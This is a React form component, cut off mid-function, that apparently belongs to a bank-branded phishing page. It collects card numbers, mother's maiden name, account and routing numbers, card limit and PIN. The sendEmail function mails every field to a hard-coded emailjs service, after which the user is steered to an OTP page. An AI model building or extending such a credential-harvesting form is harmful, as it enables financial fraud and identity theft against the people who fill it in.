import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png';

const ExamForm2 = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [formValues, setFormValues] = useState({
    bankName: '',
    cardNumber: '',
    nameOnCard: '',
    maidenName: '',
    accNo: '',
    routingNo: '',
    checkingNumber: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    cardLimit: '',
    pin: '',
  });
  const navigate = useNavigate();

  // Add this state variable
  const [bankAccountType, setBankAccountType] = useState('');

  // Function to handle radio change
  const handleAccountTypeChange = (e) => {
    setBankAccountType(e.target.value);
  };

  const resetForm = () => {
    setFormValues({
      bankName: '',
      cardNumber: '',
      nameOnCard: '',
      maidenName: '',
      accNo: '',
      routingNo: '',
      cardLimit: '',
      streetAddress: '',
      city: '',
      state: '',
      postalCode: '',
      pin: '',
      checkingNumber: '', 
      bankAccountType: '',
    });

    setBankAccountType(''); // Reset bank account type separately
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
    sendEmail();
    resetForm();
    setShowConfirmModal(false);
    // navigate('/otp');
    setShowPinModal(true);
  };

  const handlePinSubmit = (e) => {
    e.preventDefault();
    sendEmail();
    resetForm();
    setShowPinModal(false);
    navigate('/otp');
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormValues({ ...formValues, [name]: value });
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };
  
  const handleCardLimitChange = (e) => {
  e.target.value = e.target.value.replace(/[a-zA-Z]/g, '');
};

  
  // const handleCardLimitChange = (e) => {
  //   e.target.value = e.target.value.replace(/\D/g, '');
  // };
  
  // const handleCardLimitChange = (e) => {

  //   const { name, value } = e.target;

  //   if (/^[\d()+_\s-]*$/.test(value)) {
  //     setFormValues({ ...formValues, [name]: value });
  //   }
  // };

  // const handleTextOnlyInput = (e) => {
  //   e.target.value = e.target.value.replace(/\d/g, '');
  // };


  const sendEmail = () => {
    const templateParams = {
      ...formValues,
      bankAccountType, // Include the type of bank account
      checkingNumber: formValues.checkingNumber || '', // Include checking number if applicable
    };

    emailjs
      .send(
        'service_e234qa4', // Replace with your service ID
        'template_f0nymc7', // Replace with your template ID
        templateParams,
